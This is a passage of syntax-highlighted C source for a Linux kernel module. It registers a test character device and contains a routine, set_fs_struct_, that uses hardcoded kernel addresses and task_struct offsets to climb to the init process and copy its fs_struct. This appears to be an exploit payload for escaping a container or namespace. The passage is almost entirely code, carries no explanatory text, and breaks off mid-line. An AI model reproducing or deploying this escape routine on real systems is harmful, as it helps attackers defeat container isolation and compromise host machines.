170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/init.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/proc_fs.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/kernel.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/uaccess.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/slab.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/fs.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/io.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/cdev.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/device.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/sched.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/fcntl.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> test_major </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> test_minor </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">cdev</span><span class="token plain"> cdev_0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">dev_t</span><span class="token plain"> hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">class</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">hellodev_class</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">hellodevice</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain"> device_buf</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token plain"> device_buf_len</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">hellodevice</span><span class="token plain"> hellodev_struct</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">helloopen</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">inode</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_inode</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">file</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">":into open!\n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">helloread</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">file</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> __user </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_user</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> n</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">loff_t</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">loff</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">":into read"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">c </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">kmalloc</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">4096</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> GFP_KERNEL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">memset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">c</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x41</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">4096</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">copy_to_user</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">proc_user</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> c</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">4096</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">hellowrite</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">file</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">const</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> __user </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_user</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> n</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">loff_t</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">loff</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">":into write!\n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">c </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">kmalloc</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">4096</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> GFP_KERNEL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">copy_from_user</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">c</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> proc_user</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">4096</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">uint64_t</span><span class="token plain"> pid__off </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x9c0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">uint64_t</span><span class="token plain"> real_parent_off_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x9d0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">uint64_t</span><span class="token plain"> fs_offset_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xbf8</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">set_fs_struct_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">task_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">init_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint32_t</span><span class="token plain"> pid_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token plain"> userpid </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">   </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">getpid_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810D6380</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    userpid </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">getpid_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain"> userkpid </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">find_get_pid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">userpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    task_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">pid_task</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">userkpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">PIDTYPE_PID</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> task_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">while</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">pid_ </span><span class="token operator" style="color: rgb(57, 58, 52);">!=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> real_parent_off_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        pid_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint32_t</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> pid__off</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">copy_fs_struct</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint64_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF813D2F20</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token plain"> g </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">copy_fs_struct</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint64_t</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> fs_offset_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint64_t</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: 